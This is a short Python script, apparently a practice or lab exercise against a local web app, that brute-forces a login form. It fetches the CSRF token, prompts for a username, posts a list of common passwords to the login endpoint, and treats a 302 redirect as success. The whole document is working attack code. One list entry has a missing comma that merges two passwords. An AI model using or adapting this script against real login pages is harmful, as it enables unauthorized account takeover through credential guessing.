import requests

URL = 'http://127.0.0.1:8000'
session = requests.Session()
session.get(f'{URL}/log-in')

csrf_token = session.cookies['csrftoken']


username = input('Provide a username to try passwords on:')
passwords = [
    'password',
    'password123',
    'pass123word'
    '4123',
    '3412',
    '2341',
    '1234',
    '12345',
    'asd',
    'asdasd'
]

for p in passwords:
    response = session.post(
        f'{URL}/commit-login',
        data={
            'username': username,
            'password': p,
            'csrfmiddlewaretoken': csrf_token,
        },
        headers={
            'Referrer': f'{URL}/log-in'
        },
        allow_redirects=False
    )

    if response.status_code == 302:
        print(f'password found:' + p)
        break

print('finished cracking')